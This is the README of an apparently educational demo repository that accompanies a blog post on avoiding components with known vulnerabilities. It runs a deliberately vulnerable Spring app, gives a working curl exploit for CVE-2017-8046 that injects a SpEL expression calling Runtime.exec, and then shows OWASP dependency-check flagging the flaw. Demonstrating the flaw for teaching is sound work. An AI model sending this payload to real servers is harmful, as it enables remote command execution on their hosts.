_**DISCLAIMER:** This repository is supplementary to the VGS blog post,
[How to Avoid "Using Components with Known Vulnerabilities"](https://develop--vgsblog.netlify.com/posts/how-to-avoid-using-components-with-known-vulnerabilities/).
It contains an application with a known security vulnerability (namely,
[CVE-2017-8046](https://pivotal.io/security/cve-2017-8046)), as well as the
description of how to exploit it. Use the application at your own risk!_

## Setting Up

First, start the application by executing the following command from the root of the repository:

```bash
mvn clean spring-boot:run
```

Second, create a resource by sending a `POST` request like this:

```bash
curl -X POST http://localhost:8080/books \
  -H 'Content-Type: application/json' \
  -d '{"isbn":"978-3827268969","title":"Thinking in Java","author":"Bruce Eckel"}'
```

## Exploiting the Vulnerability

```bash
curl -X PATCH http://localhost:8080/books/1 -H 'Content-Type: application/json-patch+json' -d '[{"op":"replace","path":"T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"ifconfig\").getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x","value":"Your application has been hacked"}]'
```

Provided you're running the application on a Unix-based operation system (e.g.
macOS), a response will contain the host's network configuration. In fact, any
[SpEL](https://docs.spring.io/spring/docs/current/spring-framework-reference/core.html#expressions)
expression can be used.

## Checking Vulnerable Dependencies

```bash
mvn clean package verify
```

The build will fail as there's a dependency identified with a high-risk
vulnerability:

```
[ERROR] Failed to execute goal org.owasp:dependency-check-maven:3.3.2:check (default) on project CVE-2017-8046:
